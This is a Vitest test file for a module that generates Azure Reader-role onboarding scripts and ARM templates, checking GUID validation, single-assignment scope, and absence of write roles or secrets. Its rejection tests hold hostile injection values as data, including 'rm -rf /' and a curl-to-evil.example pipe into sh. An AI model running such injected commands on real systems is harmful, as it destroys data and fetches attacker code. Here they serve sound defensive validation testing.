import { describe, expect, test } from "vitest"

import {
  APP_REGISTRATION_DISPLAY_NAME,
  InvalidSubscriptionIdError,
  READER_ROLE_DEFINITION_GUID,
  READER_ROLE_NAME,
  ROLE_ASSIGNMENT_API_VERSION,
  azureOnboardingArtifacts,
  isSubscriptionId,
  readerRoleArmTemplate,
  readerRoleAzCliScript,
  subscriptionScope,
} from "@/lib/subscriptions/azure-artifacts"

/**
 * `lib/subscriptions/azure-artifacts.ts` — Requirements 11.1, 11.2, 11.6, 11.8,
 * at named examples.
 *
 * Task 8.4 adds the `fast-check` property over generated subscription ids: that
 * the exactly-one-Reader-assignment rule holds for **every** subscription id, not
 * only the two below. This file covers what a property cannot — the ARM
 * template's actual structure, the shell script's actual commands, the rejection
 * of a non-GUID id, and the fact that the two artifacts agree with each other.
 */

/** A real Azure subscription GUID. */
const SUBSCRIPTION_ID = "3f2504e0-4f89-11d3-9a0c-0305e82c3301"
const SCOPE = `/subscriptions/${SUBSCRIPTION_ID}`

/** A second id, so "contains the subscription id" cannot pass on a constant. */
const OTHER_SUBSCRIPTION_ID = "aa11bb22-cc33-dd44-ee55-ff6677889900"

/**
 * Strings that would mean the artifact grants more than read access.
 *
 * Action patterns and role names both, because either one would widen the grant:
 * an action pattern reaches a custom role definition, a role name reaches a
 * built-in one. `*` is included whole — a wildcard action grants everything, and
 * neither artifact has any legitimate use for one.
 */
const WRITE_CAPABLE_TOKENS = [
  "*",
  "/write",
  "/delete",
  "/action",
  "actions",
  "Contributor",
  "Owner",
  "User Access Administrator",
] as const

/** Flags and keys that would carry a credential value into an artifact. */
const SECRET_BEARING_TOKENS = [
  "--password",
  "client_secret",
  "clientSecret",
  "--client-secret",
] as const

function occurrences(haystack: string, needle: string): number {
  return haystack.split(needle).length - 1
}

// --- The subscription id gate ----------------------------------------------

describe("isSubscriptionId", () => {
  test.each([
    SUBSCRIPTION_ID,
    OTHER_SUBSCRIPTION_ID,
    SUBSCRIPTION_ID.toUpperCase(),
  ])("accepts %s", (id) => {
    expect(isSubscriptionId(id)).toBe(true)
  })

  test.each([
    ["empty", ""],
    ["not a GUID", "my-subscription"],
    ["leading space", ` ${SUBSCRIPTION_ID}`],
    ["trailing newline", `${SUBSCRIPTION_ID}\n`],
    ["braced", `{${SUBSCRIPTION_ID}}`],
    ["unhyphenated", SUBSCRIPTION_ID.replaceAll("-", "")],
    ["a group too short", "3f2504e0-4f89-11d3-9a0c-0305e82c330"],
    ["non-hex", "3f2504e0-4f89-11d3-9a0c-0305e82c330g"],
    ["already a scope path", SCOPE],
    // The reason the gate exists: an id is interpolated into a script an
    // administrator runs, so a command substitution must not be representable.
    ["a command substitution", "$(id)"],
    ["a shell metacharacter", `${SUBSCRIPTION_ID}'; rm -rf /; '`],
  ])("rejects %s", (_label, id) => {
    expect(isSubscriptionId(id)).toBe(false)
  })
})

describe("a non-GUID subscription id generates nothing", () => {
  const INVALID = "'; curl https://evil.example/ | sh; '"

  test.each([
    ["subscriptionScope", () => subscriptionScope(INVALID)],
    ["readerRoleAzCliScript", () => readerRoleAzCliScript(INVALID)],
    ["readerRoleArmTemplate", () => readerRoleArmTemplate(INVALID)],
    ["azureOnboardingArtifacts", () => azureOnboardingArtifacts(INVALID)],
  ])("%s throws InvalidSubscriptionIdError", (_label, call) => {
    expect(call).toThrow(InvalidSubscriptionIdError)
  })

  test("the error states the accepted shape and excludes the value", () => {
    // The same rule MissingEnvError follows. A wizard field is somewhere a
    // consultant can paste a client secret by mistake, and a "not a GUID: …"
    // message is how that reaches a log aggregator.
    let thrown: unknown
    try {
      readerRoleAzCliScript(INVALID)
    } catch (error) {
      thrown = error
    }

    expect(thrown).toBeInstanceOf(InvalidSubscriptionIdError)
    const { message, name } = thrown as InvalidSubscriptionIdError

    expect(name).toBe("InvalidSubscriptionIdError")
    expect(message).toContain("GUID")
    expect(message).toContain("8-4-4-4-12")
    expect(message).not.toContain(INVALID)
    expect(message).not.toContain("curl")
  })
})

describe("subscriptionScope", () => {
  test("is the subscription's scope path", () => {
    expect(subscriptionScope(SUBSCRIPTION_ID)).toBe(SCOPE)
    expect(subscriptionScope(OTHER_SUBSCRIPTION_ID)).toBe(
      `/subscriptions/${OTHER_SUBSCRIPTION_ID}`
    )
  })
})

// --- The `az` CLI script ---------------------------------------------------

describe("readerRoleAzCliScript — Requirements 11.1, 11.6, 11.8", () => {
  const script = readerRoleAzCliScript(SUBSCRIPTION_ID)

  test("names the target subscription and its scope", () => {
    // Requirement 11.6 — the script shows the subscription id it targets.
    expect(script).toContain(SUBSCRIPTION_ID)
    expect(script).toContain(`SUBSCRIPTION_ID='${SUBSCRIPTION_ID}'`)
    expect(script).toContain(`SCOPE='${SCOPE}'`)
    expect(script).not.toContain(OTHER_SUBSCRIPTION_ID)
  })

  test("creates the app registration and its service principal", () => {
    // Requirement 11.1 — the script is what produces the identity the
    // connection uses.
    expect(script).toContain("az ad app create")
    expect(script).toContain("az ad sp create ")
    expect(script).toContain(`--display-name "\${APP_NAME}"`)
    expect(script).toContain(`APP_NAME='${APP_REGISTRATION_DISPLAY_NAME}'`)
  })

  test("makes exactly one role assignment, Reader, at subscription scope", () => {
    // Requirement 11.8, the whole point of the artifact.
    expect(occurrences(script, "az role assignment create")).toBe(1)
    expect(occurrences(script, "role assignment")).toBe(1)
    expect(script).toContain(`ROLE='${READER_ROLE_NAME}'`)
    expect(script).toContain(`--role "\${ROLE}"`)
    expect(script).toContain(`--scope "\${SCOPE}"`)
  })

  test("does not create a role assignment as a side effect", () => {
    // `az ad sp create-for-rbac --role … --scopes …` creates its own assignment
    // while creating the principal, which would make the count above wrong
    // while every assertion in it still passed.
    expect(script).not.toContain("create-for-rbac")
    expect(script).not.toContain("--scopes")
  })

  test.each(WRITE_CAPABLE_TOKENS)("grants no %s", (token) => {
    // Requirement 11.8 — no assignment carrying a write action.
    expect(script).not.toContain(token)
  })

  test.each(SECRET_BEARING_TOKENS)("carries no %s", (token) => {
    // Requirement 11.6 — the script creates the secret on the customer's
    // machine; it never contains one.
    expect(script).not.toContain(token)
  })

  test("runs under a shell that stops on the first failure", () => {
    // Without `set -e` a failed app creation still reaches the assignment step,
    // and the customer reads a wall of output as a partial success.
    expect(script).toContain("#!/usr/bin/env bash")
    expect(script).toContain("set -euo pipefail")
  })
})

// --- The ARM template ------------------------------------------------------

describe("readerRoleArmTemplate — Requirements 11.2, 11.6, 11.8", () => {
  const rendered = readerRoleArmTemplate(SUBSCRIPTION_ID)
  const template = JSON.parse(rendered) as {
    $schema: string
    variables: Record<string, string>
    parameters: Record<string, unknown>
    resources: {
      type: string
      apiVersion: string
      name: string
      properties: Record<string, string>
    }[]
  }

  test("is valid, readable JSON deploying at subscription scope", () => {
    // Pretty-printed, because a customer's reviewer reads this before
    // approving it.
    expect(rendered).toContain("\n  ")
    expect(rendered.endsWith("\n")).toBe(true)
    expect(template.$schema).toContain("subscriptionDeploymentTemplate.json")
  })

  test("names the target subscription and its scope", () => {
    // Requirement 11.6.
    expect(rendered).toContain(SUBSCRIPTION_ID)
    expect(template.variables.targetSubscriptionId).toBe(SUBSCRIPTION_ID)
    expect(template.variables.targetScope).toBe(SCOPE)
    expect(rendered).not.toContain(OTHER_SUBSCRIPTION_ID)
  })

  test("declares exactly one resource, and it is a role assignment", () => {
    // Requirement 11.8, asserted structurally rather than by substring: a
    // second assignment would be a second array entry.
    expect(template.resources).toHaveLength(1)
    expect(template.resources[0].type).toBe(
      "Microsoft.Authorization/roleAssignments"
    )
    expect(template.resources[0].apiVersion).toBe(ROLE_ASSIGNMENT_API_VERSION)
    expect(occurrences(rendered, "roleAssignments")).toBe(1)
  })

  test("that assignment is Reader at the subscription's scope path", () => {
    // Requirement 11.8 — the role and the scope, not just the count.
    expect(template.variables.readerRoleDefinitionId).toBe(
      `${SCOPE}/providers/Microsoft.Authorization/roleDefinitions/` +
        READER_ROLE_DEFINITION_GUID
    )
    expect(template.resources[0].properties.roleDefinitionId).toBe(
      "[variables('readerRoleDefinitionId')]"
    )
    expect(template.resources[0].properties.principalType).toBe(
      "ServicePrincipal"
    )
  })

  test("is idempotent — the assignment name is derived, not random", () => {
    // A `newGuid()` name would grant a second assignment on redeployment, which
    // is the one way this template could stop emitting exactly one.
    expect(template.resources[0].name).toContain("[guid(")
    expect(template.resources[0].name).not.toContain("newGuid")
  })

  test("takes the principal object id as its only parameter", () => {
    // A credential is not among its inputs, so there is nothing for a customer
    // to paste a secret into (Requirement 11.6).
    expect(Object.keys(template.parameters)).toEqual(["principalId"])
    expect(template.resources[0].properties.principalId).toBe(
      "[parameters('principalId')]"
    )
  })

  test.each(WRITE_CAPABLE_TOKENS)("grants no %s", (token) => {
    // Requirement 11.8. `actions` is in the list because a custom role
    // definition is the other way a template could widen the grant.
    expect(rendered).not.toContain(token)
  })

  test.each(SECRET_BEARING_TOKENS)("carries no %s", (token) => {
    expect(rendered).not.toContain(token)
  })
})

// --- Both, together --------------------------------------------------------

describe("azureOnboardingArtifacts", () => {
  test("returns the same two artifacts the single generators return", () => {
    // One implementation, so the wizard's two steps cannot show a script and a
    // template that disagree about the scope.
    const artifacts = azureOnboardingArtifacts(SUBSCRIPTION_ID)

    expect(artifacts.subscriptionId).toBe(SUBSCRIPTION_ID)
    expect(artifacts.scope).toBe(SCOPE)
    expect(artifacts.roleName).toBe(READER_ROLE_NAME)
    expect(artifacts.azCliScript).toBe(readerRoleAzCliScript(SUBSCRIPTION_ID))
    expect(artifacts.armTemplate).toBe(readerRoleArmTemplate(SUBSCRIPTION_ID))
  })

  test("is pure — the same id yields byte-identical artifacts", () => {
    // No clock, no randomness, no environment. This is what lets task 8.4 state
    // the exactly-one-Reader rule as a property.
    expect(azureOnboardingArtifacts(SUBSCRIPTION_ID)).toEqual(
      azureOnboardingArtifacts(SUBSCRIPTION_ID)
    )
  })

  test("a different subscription id changes both artifacts", () => {
    const first = azureOnboardingArtifacts(SUBSCRIPTION_ID)
    const second = azureOnboardingArtifacts(OTHER_SUBSCRIPTION_ID)

    expect(second.scope).toBe(`/subscriptions/${OTHER_SUBSCRIPTION_ID}`)
    expect(second.azCliScript).not.toBe(first.azCliScript)
    expect(second.armTemplate).not.toBe(first.armTemplate)
    expect(second.azCliScript).toContain(OTHER_SUBSCRIPTION_ID)
    expect(second.armTemplate).toContain(OTHER_SUBSCRIPTION_ID)
  })

  test("Reader is the role, in both artifacts and in the returned facts", () => {
    const { armTemplate, azCliScript, roleName } =
      azureOnboardingArtifacts(SUBSCRIPTION_ID)

    expect(roleName).toBe("Reader")
    expect(azCliScript).toContain("Reader")
    expect(armTemplate).toContain("Reader")
    // Monitoring Reader alone does not grant Resource Graph inventory
    // (Requirement 11.3), so it is not what either artifact assigns.
    expect(azCliScript).not.toContain("Monitoring Reader")
    expect(armTemplate).not.toContain("Monitoring Reader")
  })
})
